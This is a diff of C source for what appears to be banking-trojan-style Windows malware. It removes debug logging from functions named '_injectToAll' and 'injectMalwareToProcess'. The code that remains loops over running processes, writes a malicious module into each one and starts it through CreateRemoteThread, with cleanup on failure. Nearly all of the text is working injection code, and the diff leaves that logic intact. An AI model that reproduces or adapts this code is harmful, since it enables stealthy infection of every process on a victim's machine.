@@ -5,7 +5,6 @@
 
 #include"defines.h"
 #include"defines.h"
-#include"debug.h"
 #include"process.h"
 #include"core.h"
 #include"str.h"
@@ -30,8 +29,6 @@ void WINAPI _entryPoint(void)
 bool _injectToAll(void)
 {
 	bool ok = false;
-
-	WDEBUG0(WDDT_INFO, "Listing processes...");  
 
 	//Looking processes as long as there are not infected.
 	LPDWORD injectedPids    = NULL;
@@ -80,16 +77,11 @@ bool _injectToAll(void)
 								    injectedPids[injectedPidsCount++] = pe.th32ProcessID;
 								    newProcesses++;
 
-								    WDEBUG2(WDDT_INFO, "pe.th32ProcessID=%u, pe.szExeFile=%s", pe.th32ProcessID,pe.szExeFile);
-
 								    if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
 								    ok=false; newProcesses=0;//TEST PURPOSES ONLY
 
 								    //goto END;
 							    }
-    #             if(BO_DEBUG > 0)
-							    else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
-    #             endif
 						    }
 						    Mem::free(tu);
 					    }
@@ -104,9 +96,6 @@ bool _injectToAll(void)
       }
 			CWA(kernel32, CloseHandle)(snap);
 		}
-#   if(BO_DEBUG > 0)
-		else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
-#   endif
 	}
 	while(newProcesses != 0);
 
@@ -132,58 +121,29 @@ static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD procces
 			void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
 			if(newImage != NULL)
 			{
-#   if(BO_DEBUG > 0)
-					WDEBUG0(WDDT_INFO, "OK: initNewModule.");
-#endif
 				// calculate routine that will be called by the new thread created
 				LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
-
-				{
-#   if(BO_DEBUG > 0)
-					WDEBUG1(WDDT_INFO, "Pointer to thread proc _injectEntryForThreadEntry=0x%x.",(LPBYTE)proc);
-#endif
-				}
 
 				HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
 				if(thread != NULL)
 				{
-					WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
-					if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
-					{
-						WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
-					}
-					else
+					if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) == WAIT_OBJECT_0)
 					{
 						ok = true;
 						if( CWA(kernel32, ResumeThread)( thread ) == (DWORD)-1 ){
-#   if(BO_DEBUG > 0)
-							WDEBUG2(WDDT_WARNING, "Resume remote thread failed, newImage=0x%p, thread=0x%08X", newImage, thread);
-#endif
 							ok=false;
 						}
 					}
 					CWA(kernel32, CloseHandle)(thread);
 				}
-				else
-				{
-#   if(BO_DEBUG > 0)
-					WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid);
-#   endif
-				}
+
 				if(!ok)
 					CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
 			}
-#   if(BO_DEBUG > 0)
-			else 
-				WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
-#   endif
 		}
 
 		CWA(kernel32, CloseHandle)(process);
 	}
-#if(BO_DEBUG > 0)
-	else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
-#endif
 
 	return ok;
 }
